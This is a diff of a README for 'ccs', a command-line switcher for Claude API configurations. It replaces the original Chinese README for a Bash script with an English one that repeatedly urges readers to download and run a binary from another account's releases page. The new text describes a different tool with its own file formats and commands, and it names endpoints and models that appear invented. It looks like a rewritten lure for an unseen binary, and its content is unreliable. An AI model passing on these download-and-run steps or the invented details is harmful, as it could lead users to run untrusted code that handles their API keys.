@@ -1,261 +1,294 @@
-# Claude Code 配置切换器 (CCS)
+# ccs — Manage Multiple Claude API Configurations from CLI 🚀
 
-一个用于管理多个 Claude API 配置的命令行工具。可以轻松在不同环境或账户的 API 密钥和基础 URL 之间切换。
+[![Releases](https://img.shields.io/badge/Releases-v--latest-blue?logo=github)](https://github.com/breakwuz/ccs/releases) [![Topic: claude-code](https://img.shields.io/badge/topic-claude--code-green)](https://github.com/topics/claude-code)
 
-[English Version](README_EN.md)
+![Hero image showing terminal and code](https://images.unsplash.com/photo-1515879218367-8466d910aaa4?q=80&w=1200&auto=format&fit=crop&ixlib=rb-4.0.3&s=8b8b7d0f2a2a2d3d5b7e44f1a3f9d5a3)
 
-## 功能特性
+A small command-line tool to manage multiple Claude API keys and base URLs. Switch between accounts and environments with a single command. The tool works with configuration files and environment variables. It fits into CI, local scripts, or a developer workstation.
 
-- **配置管理**: 存储和管理多个 Claude API 配置
-- **简单切换**: 使用单个命令在配置间切换
-- **模板支持**: 使用默认模板确保配置结构一致
-- **配置保护**: 防止删除或修改当前激活的配置
-- **信息脱敏**: API 密钥显示时自动脱敏保护隐私
-- **验证**: 名称验证和破坏性操作的确认提示
-- **多语言**: 支持中文和英文界面
-- **美观界面**: 彩色输出和图标增强用户体验
-- **自动更新**: 内置自动更新功能，保持工具始终最新
+Get the release binary from the releases page:
+https://github.com/breakwuz/ccs/releases
 
-## 安装
+Quick links
+- Releases: https://github.com/breakwuz/ccs/releases (download the binary file for your platform and run it)
+- Topic: claude-code
 
-### 一键安装（推荐）
+Table of contents
+- Features
+- Install
+- Getting started
+- Commands
+- Configuration file
+- Examples
+- Shell integration
+- Tips and best practices
+- Contributing
+- License
 
-```bash
-# 系统安装（推荐 - 使用镜像站）
-curl -fsSL "https://cdn.jsdelivr.net/gh/shuiyihan12/ccs@master/ccs.sh" | \
-sudo tee /usr/local/bin/ccs > /dev/null && sudo chmod +x /usr/local/bin/ccs
+Features
+- Manage multiple Claude API configs (name, API key, base URL, model)
+- Switch active config with one command
+- List and validate configs
+- Export active config to environment variables for scripts
+- Support for per-directory .ccsrc file
+- Commands for import/export and token masking
+- Small binary with no runtime dependencies
 
-# 用户安装（无需 sudo - 使用镜像站）
-curl -fsSL "https://cdn.jsdelivr.net/gh/shuiyihan12/ccs@master/ccs.sh" | \
-install -D -m 755 /dev/stdin ~/bin/ccs && export PATH="$PATH:~/bin"
+Install
 
-# 使用 GitHub 直链（备选方案）
-curl -fsSL https://raw.githubusercontent.com/shuiyihan12/ccs/refs/heads/master/ccs.sh | \
-sudo tee /usr/local/bin/ccs > /dev/null && sudo chmod +x /usr/local/bin/ccs
+Download the correct release binary from the releases page and run it. The releases page hosts platform builds. Pick the file that matches your OS (linux, mac, windows) and architecture (amd64, arm64).
 
-# 使用 wget（备选方案）
-wget -qO- https://raw.githubusercontent.com/shuiyihan12/ccs/refs/heads/master/ccs.sh | \
-sudo tee /usr/local/bin/ccs > /dev/null && sudo chmod +x /usr/local/bin/ccs
+Steps (example for Linux/macOS):
+1. Open the releases page: https://github.com/breakwuz/ccs/releases
+2. Download the binary file for your system (for example: ccs-linux-amd64 or ccs-darwin-amd64).
+3. Make it executable and move it into your PATH:
+   ```
+   curl -L -o ccs https://github.com/breakwuz/ccs/releases/download/v1.2.3/ccs-linux-amd64
+   chmod +x ccs
+   sudo mv ccs /usr/local/bin/
+   ```
+4. Test:
+   ```
+   ccs --version
+   ```
+
+Windows (PowerShell):
+1. Visit https://github.com/breakwuz/ccs/releases
+2. Download ccs-windows-amd64.exe
+3. Run from PowerShell:
+   ```
+   .\ccs-windows-amd64.exe --version
+   ```
+
+If the releases link ever breaks, check the Releases section on this repository page.
+
+Getting started
+
+Initialize a config store (creates a config file in your home directory by default):
+```
+ccs init
 ```
 
-### 手动安装
+Add a config for a Claude API account:
+```
+ccs add my-work-account \
+  --api-key sk-xxxxxxxxxxxxxxxx \
+  --base-url https://api.claude.ai \
+  --model claude-2
+```
 
-```bash
-# 下载脚本
-wget https://raw.githubusercontent.com/shuiyihan12/ccs/refs/heads/master/ccs.sh
-
-# 安装到系统目录（推荐）
-sudo install -m 755 ccs.sh /usr/local/bin/ccs
-
-# 或者安装到用户目录（无需 sudo）
-mkdir -p ~/bin
-install -m 755 ccs.sh ~/bin/ccs
-# 确保 ~/bin 在 PATH 中
-export PATH="$PATH:~/bin"
-``` 
-
-## 使用方法
-
-### 基础命令
-
-```bash
-# 显示帮助信息（默认行为）
-ccs
-# 或
-ccs help
-
-# 显示当前配置和所有配置列表
+List configs:
+```
 ccs list
-# 或
-ccs ls
-
-# 添加新配置
-ccs add <名称> <api_key> <base_url>
-# 示例:
-ccs add work sk-ant-xxxxx https://api.anthropic.com
-
-# 切换到配置
-ccs switch <名称>
-# 或
-ccs sw work
-
-# 删除配置（无法删除当前激活的配置）
-ccs delete <名称>
-# 或
-ccs del work
-ccs rm work
-
-# 重命名配置
-ccs rename <旧名称> <新名称>
-# 或
-ccs mv old_name new_name
-
-# 修改配置
-ccs modify <配置名称> <新密钥> <新地址>
-# 修改指定配置（只能修改非激活状态的配置）
-ccs modify work sk-new-key https://new-api.com
-
-# 设置配置模板
-ccs template [配置名称]
-# 使用当前配置作为模板
-ccs template
-# 使用指定配置作为模板
-ccs template work
-
-# 显示版本信息
-ccs version
-
-# 显示帮助
-ccs help
-
-# 更新到最新版本
-ccs update
-
-# 卸载工具
-ccs uninstall
 ```
 
-### 自动更新
-
-```bash
-# 检查并更新到最新版本
-ccs update
-# 系统会自动检查版本，如有更新会询问是否升级（默认选择是）
-
-# 如果更新后出现问题，可以回滚到之前版本
-ccs update --rollback
+Set an active config:
+```
+ccs use my-work-account
 ```
 
-### 使用示例
+Export environment variables for current shell:
+```
+eval $(ccs env)
+# now CLAUDE_API_KEY and CLAUDE_BASE_URL are set in your shell
+```
 
-```bash
-# 添加不同环境配置
-ccs add production sk-ant-prod-xxxxx https://api.anthropic.com
-ccs add development sk-ant-dev-xxxxx https://api.anthropic.com  
-ccs add custom sk-ant-custom-xxxxx https://custom.api.com
+Commands
 
-# 查看当前状态
+ccs init
+- Create a default config file (~/.ccsrc by default). Use --path to place the file elsewhere.
+
+ccs add <name> [flags]
+- Add a new config. Flags:
+  --api-key string
+  --base-url string
+  --model string
+  --description string
+
 ccs list
-# 输出示例（新格式）:
-# 🔄 当前配置：
-#   ✓ production (settings.json.production) (激活)
-# 
-# ⚙️ 可用配置：
-#   • development (settings.json.development)
-#     ➤ Base URL: https://api.anthropic.com
-#     ➤ API Key:  sk-ant-****xxxxx
-# 
-#   ✓ production (settings.json.production) (激活)
-#     ➤ Base URL: https://api.anthropic.com  
-#     ➤ API Key:  sk-ant-****xxxxx
-# 
-#   • custom (settings.json.custom)
-#     ➤ Base URL: https://custom.api.com
-#     ➤ API Key:  sk-ant-****xxxxx
+- Show saved configs. The active config shows with a marker.
 
-# 输出示例（传统格式）:
-# 🔄 当前配置：
-#   ✓ production (settings-production.json) (激活)
-# 
-# ⚙️ 可用配置：
-#   • development (settings-development.json)
-#     ➤ Base URL: https://api.anthropic.com
-#     ➤ API Key:  sk-ant-****xxxxx
-#     ➤ API Key:  sk-ant-****xxxxx
+ccs use <name>
+- Set active config by name. The tool updates the local config store and prints the active entry.
 
-# 切换到开发环境
-ccs switch development
-# 输出:
-# ✅ 已切换到配置: development
-# ⚠️ 重要提醒：请重启 Claude Code 以使更改生效。
+ccs show [name]
+- Print a single config in plain text or JSON. Use --json to get JSON output.
 
-# 尝试删除当前激活的配置（会被阻止）
-ccs delete development
-# 输出:
-# ❌ 错误：无法删除当前激活的配置 'development'
-# ℹ️ 请先切换到其他配置，使用：ccs switch <其他配置>
+ccs env [--shell=bash|zsh|powershell]
+- Print shell export commands for the active config. Use eval $(ccs env) or run the specific shell form.
 
-# 修改非激活配置（然后可以切换过去）
-ccs modify production sk-new-prod-key https://new-api.com
+ccs validate [name]
+- Run a small API call to validate the stored API key and base URL. This command uses the minimal API call that Claude accepts for a key check.
 
-# 不能修改当前激活配置（因为Claude Code需要重启才能生效）
+ccs import <file>
+- Import configs from a JSON or YAML file.
+
+ccs export <file>
+- Export all configs to a JSON or YAML file.
+
+ccs remove <name>
+- Delete a saved config.
+
+ccs mask <name>
+- Show masked keys. Use when you must print config info in logs.
+
+Configuration file
+
+The default config file sits at:
+- Unix: ~/.ccsrc
+- Windows: %USERPROFILE%\.ccsrc
+
+Config format (YAML)
+```
+active: work
+configs:
+  work:
+    api_key: sk-xxxxxxxxxxxxxxxx
+    base_url: https://api.claude.ai
+    model: claude-2
+    description: Work account
+  personal:
+    api_key: sk-yyyyyyyyyyyyyyyy
+    base_url: https://api-eu.claude.ai
+    model: claude-2.1
+    description: Personal account
 ```
 
-## 保护机制
+Fields
+- api_key: The CLAUDE API key.
+- base_url: The full base URL for the Claude API endpoint.
+- model: The model name you wish to call.
+- description: Optional text.
 
-为了防止误操作，CCS 提供了以下保护机制：
+You can also store configs in JSON. The CLI reads both formats.
 
-### 删除保护
-- **无法删除当前激活的配置**
-- 必须先切换到其他配置才能删除
-- 提供清晰的错误提示和解决方案
+Per-directory config
+Drop a .ccsrc file in a project directory. When you run ccs inside that directory, the tool prefers the local .ccsrc over the global file. This helps keep credentials separate for project work.
 
-### 修改保护  
-- **无法修改当前激活的配置**：因为Claude Code需要重启才能读取配置文件更改
-- **只能修改非激活状态的配置**：修改后切换到该配置时立即生效
-- **建议工作流程**：修改非激活配置 → 切换到该配置 → 重启Claude Code
+Examples
 
-## 语言支持
-
-CCS 工具支持中英文界面，通过配置文件 `~/.claude/ccs.conf` 设置默认语言。首次使用时会引导您选择语言偏好。
-
-```bash
-# 首次使用时会出现语言选择提示
-ccs help
-
-# 配置文件中的语言设置
-# ~/.claude/ccs.conf
-default_language=zh  # 或 en
+Switching accounts for a script:
+```
+# switch to CI account
+ccs use ci-account
+eval $(ccs env)
+python generate.py
 ```
 
-默认语言设置后，所有命令都会使用该语言显示信息。
+Automated test flow:
+1. Use a temporary config injected by CI.
+2. Run ccs validate to ensure the key is valid.
+3. Run the tests that use Claude.
 
-## 配置格式
+Create a new config from environment variables:
+```
+ccs add temp \
+  --api-key "$CLAUDE_API_KEY" \
+  --base-url "$CLAUDE_BASE_URL" \
+  --model "${CLAUDE_MODEL:-claude-2}"
+```
 
-工具支持两种配置文件命名格式，用户可在首次使用时选择：
+Import export example:
+```
+ccs export ~/backup/ccs-backup.yaml
+# edit file, then import on another machine
+ccs import ~/backup/ccs-backup.yaml
+```
 
-1. **新格式**：`~/.claude/settings.json.<配置名称>` [默认]
-2. **传统格式**：`~/.claude/settings-<配置名称>.json`
+Shell integration
 
-配置文件具有以下结构的 JSON 格式：
-
-```json
-{
-  "env": {
-    "ANTHROPIC_API_KEY": "your_api_key_here",
-    "ANTHROPIC_BASE_URL": "your_base_url_here",
-    "CLAUDE_CODE_DISABLE_NONESSENTIAL_TRAFFIC": 1,
-    "DISABLE_TELEMETRY": 1
-  },
-  "includeCoAuthoredBy": false,
-  "permissions": {
-    "allow": [
-      "Bash(find:*)",
-      "Bash(mvn clean:*)"
-    ],
-    "deny": []
-  }
+Bash / Zsh
+Add this to ~/.bashrc or ~/.zshrc to auto-switch when you enter a project with a .ccsrc file:
+```
+function ccs_cd_hook() {
+  if [ -f .ccsrc ]; then
+    eval $(ccs env)
+  fi
 }
+autoload -U add-zsh-hook
+add-zsh-hook chpwd ccs_cd_hook
+ccs_cd_hook
 ```
 
-## 隐私保护
-
-- **API 密钥脱敏**: 显示时只显示前12位和后10位，中间用星号代替
-- **安全存储**: 配置文件存储在用户主目录下，权限受系统保护
-
-## 卸载/清理
-
-### 完全删除脚本和配置
-
-```bash
-# 使用 CCS 内置卸载功能删除配置文件（可选择性删除）（推荐）
-ccs uninstall
-
-# 删除系统安装的脚本
-sudo rm -f /usr/local/bin/ccs
-
-# 手动删除配置文件和默认模板（如需要）
-rm -rf ~/.claude/settings.json.*
-rm -rf ~/.claude/settings-*.json
-rm -f ~/.claude/ccs.conf
+PowerShell
+A simple helper function:
 ```
+function Set-CCSEnv {
+  $envOut = ccs env --shell=powershell
+  Invoke-Expression $envOut
+}
+Set-CCSEnv
+```
+
+Tips and best practices
+
+- Do not commit API keys to git. Keep ~/.ccsrc or .ccsrc out of your repo. Use a secret manager where possible.
+- Use descriptive names for configs (work, personal, ci, staging).
+- Use ccs mask before printing config contents in logs.
+- Keep the base_url precise. If your org routes Claude traffic through a proxy, set base_url to that proxy endpoint.
+- Use the validate command in CI to fail early when credentials break.
+
+Security model
+
+ccs stores API keys in the config file. The file permission matters. On Unix, ensure the file is readable only by your user:
+```
+chmod 600 ~/.ccsrc
+```
+
+The tool never sends configs to third-party servers. It calls Claude only when you run validate or use the env export plus other features that hit the API. Use the mask command to hide keys in logs.
+
+Advanced usage
+
+Programmatic output
+- Use --json on list and show to parse configs in scripts.
+```
+ccs list --json | jq '.configs | keys'
+```
+
+Profiles per environment
+- Create profiles for envs like staging or production, and switch them in deployment scripts.
+
+CI integration
+- Store a minimal config in CI secrets and create a config at job start:
+```
+ccs add ci --api-key "$CI_CLAUDE_KEY" --base-url "$CI_CLAUDE_URL" --model claude-2
+ccs use ci
+eval $(ccs env)
+```
+
+Troubleshooting
+
+If ccs does not run after download, check file permissions and PATH. If releases change, go to the releases page and download the matching binary for your OS:
+https://github.com/breakwuz/ccs/releases
+
+If a validate call fails, confirm api_key and base_url. Use ccs show <name> to inspect the saved config.
+
+Contributing
+
+- Open an issue for bugs or feature requests.
+- Fork the repo and submit a pull request.
+- Follow the code style guidelines in CONTRIBUTING.md.
+- Add tests for new features.
+
+Release downloads
+
+Download the binary file for your OS from the releases page and run it. The releases page lists assets per release. Pick the right asset and follow the platform-specific install steps above.
+https://github.com/breakwuz/ccs/releases
+
+Badges and images
+
+- Releases badge links directly to the release page.
+- Topic badge points to the claude-code topic.
+
+Legal
+
+This project uses an open source license. See the LICENSE file in the repository for details.
+
+Contact
+
+For questions or help, open an issue on GitHub and tag it with "help" or "question". Use the claude-code topic when appropriate.
+
+License
+
+MIT License
+
